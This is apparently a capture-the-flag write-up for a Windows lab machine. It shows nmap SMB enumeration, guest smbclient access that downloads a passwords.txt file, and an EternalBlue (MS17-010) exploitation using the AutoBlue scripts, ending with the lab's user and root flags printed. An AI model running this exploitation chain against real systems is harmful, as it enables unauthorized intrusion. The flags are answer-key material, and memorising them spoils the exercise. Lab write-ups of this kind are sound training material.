# Relevant

```
export IP=10.10.138.24
```

Nmap shows SMB

```
nmap -p 139,445 --script smb-enum -oA nmap/smb-enum $IP


PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.138.24\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.138.24\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.138.24\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.138.24\nt4wrksv:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-enum-sessions:
|_  <nobody>
```
Log in with smbclient. Because `Current user access: READ/WRITE` we can read and write files on the `nt4wrksv` share

```
smbclient \\\\IP\nt4wrksv -U WORKGROUP\anyuser

smb: \> dir
  .                                   D        0  Sat Mar 11 10:54:13 2023
  ..                                  D        0  Sat Mar 11 10:54:13 2023
  passwords.txt                       A       98  Sat Jul 25 09:15:33 2020

smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Then try for known vulnerabilities

```
nmap -p 139,445 --script smb-vuln -oA nmap/smb-vuln $IP


PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
```

We can use CVE-2017-0143 (Eternal Blue) to gain access to the box. Download AutoBlue

```
shellcode/shell_prep.sh


listener_prep.sh

python2 zzz_exploit.py -target-ip $IP -port 445 'WORKGROUP\Bob: [PASSWORD]' 

```


1. User Flag

```
C:\Windows\system32>type C:\Users\Bob\Desktop\user.txt                                                                                                     
THM{fdk4ka34vk346ksxfr21tg789ktf45} 
```

2. Root Flag:

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt                                                                                       
THM{1fk5kf469devly1gl320zafgl345pv} 
```
